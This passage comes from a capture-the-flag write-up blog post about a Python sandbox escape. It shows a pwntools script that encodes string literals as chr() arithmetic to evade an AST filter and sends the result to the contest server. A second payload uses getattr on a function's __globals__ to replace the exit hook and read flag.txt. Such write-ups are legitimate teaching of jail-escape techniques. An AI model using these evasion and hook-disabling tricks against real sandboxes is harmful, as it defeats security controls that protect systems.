style="color:#e6db74">&#39;MatchStar&#39;</span>, <span style="color:#e6db74">&#39;Expression&#39;</span>, <span style="color:#e6db74">&#39;excepthandler&#39;</span>, <span style="color:#e6db74">&#39;Starred&#39;</span>, <span style="color:#e6db74">&#39;Param&#39;</span>, <span style="color:#e6db74">&#39;Sub&#39;</span>, <span style="color:#e6db74">&#39;NotIn&#39;</span>, <span style="color:#e6db74">&#39;name&#39;</span>, <span style="color:#e6db74">&#39;MatchSequence&#39;</span>, <span style="color:#e6db74">&#39;Raise&#39;</span>, <span style="color:#e6db74">&#39;parse&#39;</span>, <span style="color:#e6db74">&#39;AugStore&#39;</span>, <span style="color:#e6db74">&#39;BinOp&#39;</span>, <span style="color:#e6db74">&#39;AST&#39;</span>, <span style="color:#e6db74">&#39;Name&#39;</span>, <span style="color:#e6db74">&#39;USub&#39;</span>, <span style="color:#e6db74">&#39;UAdd&#39;</span>, <span style="color:#e6db74">&#39;_Precedence&#39;</span>, <span style="color:#e6db74">&#39;BitAnd&#39;</span>, <span style="color:#e6db74">&#39;_INFSTR&#39;</span>, <span style="color:#e6db74">&#39;_const_types&#39;</span>, <span style="color:#e6db74">&#39;copy_location&#39;</span>, <span style="color:#e6db74">&#39;_simple_enum&#39;</span>, <span style="color:#e6db74">&#39;doc&#39;</span>, <span style="color:#e6db74">&#39;MatchAs&#39;</span>, <span style="color:#e6db74">&#39;builtins&#39;</span>, <span style="color:#e6db74">&#39;spec&#39;</span>, <span style="color:#e6db74">&#39;type_ignore&#39;</span>, <span style="color:#e6db74">&#39;Str&#39;</span>, <span style="color:#e6db74">&#39;Nonlocal&#39;</span>, <span style="color:#e6db74">&#39;cmpop&#39;</span>, <span style="color:#e6db74">&#39;main&#39;</span>, <span style="color:#e6db74">&#39;iter_child_nodes&#39;</span>, <span style="color:#e6db74">&#39;MatMult&#39;</span>, <span style="color:#e6db74">&#39;Mod&#39;</span>, <span style="color:#e6db74">&#39;Module&#39;</span>, <span style="color:#e6db74">&#39;BitXor&#39;</span>, <span style="color:#e6db74">&#39;GeneratorExp&#39;</span>, <span style="color:#e6db74">&#39;Load&#39;</span>, <span style="color:#e6db74">&#39;_setter&#39;</span>, <span style="color:#e6db74">&#39;Assert&#39;</span>, <span style="color:#e6db74">&#39;boolop&#39;</span>, <span style="color:#e6db74">&#39;slice&#39;</span>, <span style="color:#e6db74">&#39;_const_node_type_names&#39;</span>, <span style="color:#e6db74">&#39;_splitlines_no_ff&#39;</span>, <span style="color:#e6db74">&#39;expr_context&#39;</span>, <span style="color:#e6db74">&#39;_MULTI_QUOTES&#39;</span>, <span style="color:#e6db74">&#39;NodeVisitor&#39;</span>, <span style="color:#e6db74">&#39;BitOr&#39;</span>, <span style="color:#e6db74">&#39;package&#39;</span>, <span style="color:#e6db74">&#39;Div&#39;</span>, <span style="color:#e6db74">&#39;Continue&#39;</span>, <span style="color:#e6db74">&#39;PyCF_ALLOW_TOP_LEVEL_AWAIT&#39;</span>, <span style="color:#e6db74">&#39;AsyncFor&#39;</span>, <span style="color:#e6db74">&#39;MatchMapping&#39;</span>, <span style="color:#e6db74">&#39;LShift&#39;</span>, <span style="color:#e6db74">&#39;pattern&#39;</span>, <span style="color:#e6db74">&#39;DictComp&#39;</span>, <span style="color:#e6db74">&#39;mod&#39;</span>, <span style="color:#e6db74">&#39;SetComp&#39;</span>, <span style="color:#e6db74">&#39;Invert&#39;</span>, <span style="color:#e6db74">&#39;_pad_whitespace&#39;</span>, <span style="color:#e6db74">&#39;While&#39;</span>, <span style="color:#e6db74">&#39;MatchSingleton&#39;</span>, <span style="color:#e6db74">&#39;PyCF_ONLY_AST&#39;</span>, <span style="color:#e6db74">&#39;iter_fields&#39;</span>, <span style="color:#e6db74">&#39;Suite&#39;</span>, <span style="color:#e6db74">&#39;Pass&#39;</span>, <span style="color:#e6db74">&#39;Add&#39;</span>}
</span></span></code></pre></div><p>Annoyingly, we are not allowed to use constants.
However, we have all builtins and can build our constants ourselves.
We get a number, specifically the number three, from</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>len(dir())
</span></span></code></pre></div><p>With <code>Add</code> we can have all multiples of three.
To get all natural numbers also a one would be nice to have.
We get this with</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pow(len(dir()), len(set()))
</span></span></code></pre></div><p>With <code>chr</code> and <code>Add</code> on strings we can construct arbitrary strings.
In the final solve I only use strings, so this low effort code replaces all string literals with this construction and sends it to the remote.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pwn
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = pwn.remote(&#39;localhost&#39;, 13336)</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>remote(<span style="color:#e6db74">&#39;mandf.csaw.io&#39;</span>, <span style="color:#ae81ff">13336</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;payload.py&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>strings <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">&#34;&#39;(.*?)&#39;&#34;</span>, payload)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> string <span style="color:#f92672">in</span> set(strings):
</span></span><span style="display:flex;"><span>    string_replace <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string:
</span></span><span style="display:flex;"><span>        o <span style="color:#f92672">=</span> ord(c)
</span></span><span style="display:flex;"><span>        thress <span style="color:#f92672">=</span> o <span style="color:#f92672">//</span> <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>        ones <span style="color:#f92672">=</span> o <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>        thress_replacements <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;len(dir())&#39;</span>] <span style="color:#f92672">*</span> thress
</span></span><span style="display:flex;"><span>        ones_replacements <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;pow(len(dir()), len(set()))&#39;</span>] <span style="color:#f92672">*</span> ones
</span></span><span style="display:flex;"><span>        c_replace <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;chr(&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; + &#39;</span><span style="color:#f92672">.</span>join([<span style="color:#f92672">*</span>thress_replacements, <span style="color:#f92672">*</span>ones_replacements]) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;)&#39;</span>
</span></span><span style="display:flex;"><span>        string_replace<span style="color:#f92672">.</span>append(c_replace)
</span></span><span style="display:flex;"><span>    string_replace <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39; + &#39;</span><span style="color:#f92672">.</span>join(string_replace)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#39;</span><span style="color:#e6db74">{</span>string<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>, string_replace)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;here: &#39;</span>, payload<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;__EOF__&#39;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvall(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>decode())
</span></span></code></pre></div><p>Okay, next we are not allowed to access attributes (i.e. using <code>bla.blub</code>).
Here I first used Python 3.10 matching, but I didn&rsquo;t even need to in the final solve, because <code>getattr</code> is more convenient.
For example, we can get the <code>__globals__</code> of the parent scope by doing <code>getattr</code> on the <code>banner</code> function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>getattr(banner, <span style="color:#e6db74">&#39;__globals__&#39;</span>)
</span></span></code></pre></div><p>Okay, this is something to work with.
When we trigger a forbidden event at runtime, the parent code calls <code>myExit</code> which is assigned to be <code>exit</code>.
We need to find a way to prevent the code from exiting.
The idea is to reassign <code>myExit</code> with a NOP.
The NOP at our disposal is <code>bool()</code>.
It has no side effects and takes no arguments.
The plan for the reassignment is to replace <code>myExit</code> in the <code>__globals__</code> of the parent.
<code>__globals__</code> is a <code>dict</code>, but we are not allowed to access it using subscript (i.e. <code>__globals__['myExit'] = bool()</code>).
Instead, we use <code>pop</code> and <code>setdefault</code> to do this.
Again, we use <code>getattr</code> to this time obtain a function, we can directly call.
It is still bound to that object.</p>
<p>With that we can disable <code>myExit</code>, <code>open</code>, <code>read</code>, and <code>print</code> the flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>getattr(getattr(banner, <span style="color:#e6db74">&#39;__globals__&#39;</span>), <span style="color:#e6db74">&#39;pop&#39;</span>)(<span style="color:#e6db74">&#39;myExit&#39;</span>)
</span></span><span style="display:flex;"><span>getattr(getattr(banner, <span style="color:#e6db74">&#39;__globals__&#39;</span>), <span style="color:#e6db74">&#39;setdefault&#39;</span>)(<span style="color:#e6db74">&#39;myExit&#39;</span>, bool)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(getattr(open(<span style="color:#e6db74">&#39;flag.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>), <span style="color:#e6db74">&#39;read&#39;</span>)())
</span></span></code></pre></div>
      </div>
    </section>
    <footer class="max-w-prose pt-8 print:hidden">
      
  <div class="flex">
    
    
    
      
      
        
        








  
    <picture
      class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
      
    >
      
      
      
      
      <img
        width="400"
        height="400"
        class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
        alt="Liam"
        loading="lazy" decoding="async"
        
          src="https://wachter-space.de/img/author.jpg"
        
      />
    </picture>
  


      
    
    <div class="place-self-center">
      
        <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
          Author
        </div>
        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
          Liam
        </div>
      
      
        <div class="text-sm text-neutral-700 dark:text-neutral-400">Security Engineer focused on runtimes.</div>
      
      <div class="text-2xl sm:text-lg">
  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
    
      
        <a
          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
          style="will-change:transform;"
          href="https://twitter.com/NearBeteigeuze"
          target="_blank"
          aria-label="Twitter"
          rel="me noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
</span></a
        >
      
    
      
        <a
          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
          style="will-change:transform;"
          href="https://www.linkedin.com/in/liam-wachter-716582198/"
          target="_blank"
          aria-label="Linkedin"
          rel="me noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
</span></a
        >
      
    
      
        <a
          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
          style="will-change:transform;"
          href="https://mastodon.cloud/@95p"
          target="_blank"
          aria-label="Mastodon"
          rel="me noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M433 179.11c0-97.2-63.71-125.7-63.71-125.7-62.52-28.7-228.56-28.4-290.48 0 0 0-63.72 28.5-63.72 125.7 0 115.7-6.6 259.4 105.63 289.1 40.51 10.7 75.32 13 103.33 11.4 50.81-2.8 79.32-18.1 79.32-18.1l-1.7-36.9s-36.31 11.4-77.12 10.1c-40.41-1.4-83-4.4-89.63-54a102.54 102.54 0 0 1-.9-13.9c85.63 20.9 158.65 9.1 178.75 6.7 56.12-6.7 105-41.3 111.23-72.9 9.8-49.8 9-121.5 9-121.5zm-75.12 125.2h-46.63v-114.2c0-49.7-64-51.6-64 6.9v62.5h-46.33V197c0-58.5-64-56.6-64-6.9v114.2H90.19c0-122.1-5.2-147.9 18.41-175 25.9-28.9 79.82-30.8 103.83 6.1l11.6 19.5 11.6-19.5c24.11-37.1 78.12-34.8 103.83-6.1 23.71 27.3 18.4 53 18.4 175z"/></svg>
</span></a
        >
      
    
  </div>

</div>
    </div>
  </div>


      

      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="group flex" href="https://wachter-space.de/2023/11/11/debugging-the-technical-interview/">
              <span
                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
                ><span class="ltr:inline rtl:hidden">&larr;</span
                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Debugging the Technical Interview</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2023-11-11 00:00:00 &#43;0000 UTC">11 November 2023</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="group flex text-right" href="https://wachter-space.de/2023/12/03/v8-design-docs/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >V8 Design Docs</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2023-12-03 00:00:00 &#43;0000 UTC">3 December 2023</time>
                  
                </span>
              </span>
              <span
                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
                ><span class="ltr:inline rtl:hidden">&rarr;</span
                ><span class="ltr:hidden rtl:inline">&larr;</span></span
              >
            </a>
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

      </main>
      
        <div
          class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12"
          id="to-top"
          hidden="true"
        >
          <a
            href="#the-top"
            class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
            aria-label="Scroll to top"
            title="Scroll to top"
          >
            &uarr;
          </a>
        </div>
      <footer class="py-10 print:hidden">
  
  
    <nav class="pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
      <ul class="flex list-none flex-col sm:flex-row">
        
          
          <li class="group mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0">
            
              <a
                href="/index.xml"
                title=""
                
                ><span
                    class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                    >RSS</span
                  >
                </a
              >
            
          </li>
        
          
          <li class="group mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0">
            
              <a
                href="https://twitter.com/NearBeteigeuze"
                title=""
                
                ><span
                    class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                    >Twitter</span
                  >
                </a
              >
            
          </li>
        
      </ul>
    </nav>
  
  <div class="flex items-center justify-between">
    <div>
      
      
        <p class="text-sm text-neutral-500 dark:text-neutral-400">
            &copy;
            2026
            Liam
        </p>
      
      
      
        <p class="text-xs text-neutral-500 dark:text-neutral-400">
          
          
          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
        </p>
      
    </div>
    <div class="flex flex-row items-center">
      
      
      
      
    </div>
  </div>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 z-50 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
  data-url="https://wachter-space.de/"
>
  <div
    id="search-modal"
    class="top-20 mx-auto flex min-h-0 w-full max-w-3xl flex-col rounded-md border border-neutral-200 bg-neutral shadow-lg dark:border-neutral-700 dark:bg-neutral-800"
  >
    <header class="relative z-10 flex flex-none items-center justify-between px-2">
      <form class="flex min-w-0 flex-auto items-center">
        <div class="flex h-8 w-8 items-center justify-center text-neutral-400">
          <span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
        </div>
        <input
          type="search"
          id="search-query"
          class="mx-1 flex h-12 flex-auto appearance-none bg-transparent focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex h-8 w-8 items-center justify-center text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)"
      >
        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
      </button>
    </header>
    <section class="flex-auto overflow-auto px-2">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

    </div>
  </body>
</html>
